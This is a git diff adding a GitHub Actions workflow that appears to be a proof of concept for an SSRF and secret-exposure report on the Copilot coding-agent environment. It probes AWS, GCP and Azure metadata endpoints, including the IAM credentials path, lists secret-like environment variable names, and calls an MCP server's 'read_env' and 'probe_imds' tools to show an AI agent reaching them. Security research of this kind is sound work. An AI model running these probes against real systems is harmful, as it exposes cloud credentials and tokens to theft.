@@ -1,0 +1,153 @@
+name: SSRF Probe Test (Simulates Copilot Agent Environment)
+
+on:
+  workflow_dispatch:
+    inputs:
+      probe_target:
+        description: 'Probe target: all, aws, gcp, azure'
+        required: false
+        default: 'all'
+
+# Simulate the Copilot agent environment
+# The copilot-setup-steps.yml runs as a regular GitHub Actions step
+# with NO firewall restrictions
+
+jobs:
+  copilot-environment-probe:
+    runs-on: ubuntu-latest
+    environment: copilot
+    steps:
+      # Phase 1: Environment recon (same as copilot-setup-steps.yml)
+      - name: Environment recon (pre-firewall simulation)
+        run: |
+          echo "=== PHASE 1: ENVIRONMENT PROBE ==="
+          echo ""
+          echo "--- Hostname and network identity ---"
+          hostname
+          hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep "inet "
+          cat /etc/resolv.conf 2>/dev/null | head -5
+
+          echo ""
+          echo "--- Available environment variables (keys only, values redacted) ---"
+          env | grep -iE '(GITHUB|ACTIONS|AWS|GCP|AZURE|TOKEN|SECRET|KEY|CREDENTIAL|PASSWORD|RUNNER)' \
+            | sed 's/=.*$/=[REDACTED-FOR-PoC]/' \
+            || echo "No sensitive env vars found"
+
+          echo ""
+          echo "--- GITHUB_TOKEN scope check ---"
+          if [ -n "$GITHUB_TOKEN" ]; then
+            echo "[CONFIRMED] GITHUB_TOKEN is present (${#GITHUB_TOKEN} chars)"
+            echo "Prefix: ${GITHUB_TOKEN:0:4}..."
+          else
+            echo "[INFO] GITHUB_TOKEN not set"
+          fi
+
+      # Phase 2: AWS IMDS probe
+      - name: AWS IMDS probe
+        run: |
+          echo "=== PHASE 2: AWS IMDS PROBE ==="
+          echo "Target: http://169.254.169.254/latest/meta-data/"
+          
+          RESPONSE=$(curl -s --max-time 5 --connect-timeout 3 \
+            "http://169.254.169.254/latest/meta-data/" 2>&1)
+          EXIT_CODE=$?
+          
+          if [ $EXIT_CODE -eq 0 ] && [ -n "$RESPONSE" ]; then
+            echo "[CONFIRMED] AWS IMDS reachable!"
+            echo "Response:"
+            echo "$RESPONSE"
+            
+            echo ""
+            echo "--- IAM role check ---"
+            IAM_RESPONSE=$(curl -s --max-time 5 \
+              "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>&1)
+            if [ -n "$IAM_RESPONSE" ]; then
+              echo "[CONFIRMED] IAM roles found:"
+              echo "$IAM_RESPONSE"
+            fi
+          else
+            echo "[RESULT] AWS IMDS not reachable (exit code: $EXIT_CODE)"
+            echo "Response: $RESPONSE"
+          fi
+
+      # Phase 3: GCP metadata probe
+      - name: GCP metadata probe
+        run: |
+          echo "=== PHASE 3: GCP METADATA PROBE ==="
+          echo "Target: http://metadata.google.internal/computeMetadata/v1/"
+          
+          RESPONSE=$(curl -s --max-time 5 --connect-timeout 3 \
+            -H "Metadata-Flavor: Google" \
+            "http://metadata.google.internal/computeMetadata/v1/instance/zone" 2>&1)
+          EXIT_CODE=$?
+          
+          if [ $EXIT_CODE -eq 0 ] && [ -n "$RESPONSE" ]; then
+            echo "[CONFIRMED] GCP metadata reachable: $RESPONSE"
+          else
+            echo "[RESULT] GCP metadata not reachable (exit code: $EXIT_CODE)"
+          fi
+
+      # Phase 4: Azure IMDS probe
+      - name: Azure IMDS probe
+        run: |
+          echo "=== PHASE 4: AZURE IMDS PROBE ==="
+          echo "Target: http://169.254.169.254/metadata/instance"
+          
+          RESPONSE=$(curl -s --max-time 5 --connect-timeout 3 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1)
+          EXIT_CODE=$?
+          
+          if [ $EXIT_CODE -eq 0 ] && [ -n "$RESPONSE" ]; then
+            echo "[CONFIRMED] Azure IMDS reachable!"
+            echo "Response (first 500 chars):"
+            echo "$RESPONSE" | head -c 500
+          else
+            echo "[RESULT] Azure IMDS not reachable (exit code: $EXIT_CODE)"
+          fi
+
+      # Phase 5: MCP server test
+      - uses: actions/checkout@v4
+      - name: Test MCP server (simulates Copilot MCP usage)
+        run: |
+          echo "=== PHASE 5: MCP SERVER TEST ==="
+          node --version
+          
+          # Test the MCP server initialization
+          INIT='{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","clientInfo":{"name":"test","version":"1"},"capabilities":{}}}'
+          LIST='{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
+          ENV_CALL='{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_env","arguments":{}}}'
+          IMDS_CALL='{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"probe_imds","arguments":{"target":"all"}}}'
+          
+          echo "--- Testing MCP server tools/list ---"
+          printf '%s\n%s\n' "$INIT" "$LIST" | timeout 10 node mcp-server.js 2>/dev/null | tail -1 | python3 -m json.tool || echo "MCP server test failed"
+          
+          echo ""
+          echo "--- Testing MCP server read_env ---"
+          printf '%s\n%s\n%s\n' "$INIT" "$LIST" "$ENV_CALL" | timeout 10 node mcp-server.js 2>/dev/null | tail -1 | python3 -m json.tool || echo "read_env test failed"
+          
+          echo ""
+          echo "--- Testing MCP server probe_imds ---"
+          printf '%s\n%s\n%s\n' "$INIT" "$LIST" "$IMDS_CALL" | timeout 30 node mcp-server.js 2>/dev/null | tail -1 | python3 -m json.tool || echo "probe_imds test failed"
+
+      # Phase 6: Internal network probe
+      - name: Internal network probe
+        run: |
+          echo "=== PHASE 6: INTERNAL NETWORK PROBE ==="
+          
+          # Check what network interfaces are available
+          echo "--- Network interfaces ---"
+          ip addr show 2>/dev/null || ifconfig 2>/dev/null
+          
+          echo ""
+          echo "--- DNS resolution ---"
+          cat /etc/resolv.conf
+          
+          echo ""
+          echo "--- GitHub API internal access ---"
+          curl -s --max-time 5 "https://api.github.com/meta" | python3 -c "
+          import sys,json
+          d=json.load(sys.stdin)
+          print(f'GitHub API reachable: yes')
+          print(f'Verifiable password auth: {d.get(\"verifiable_password_authentication\", \"N/A\")}')
+          " || echo "GitHub API not reachable"
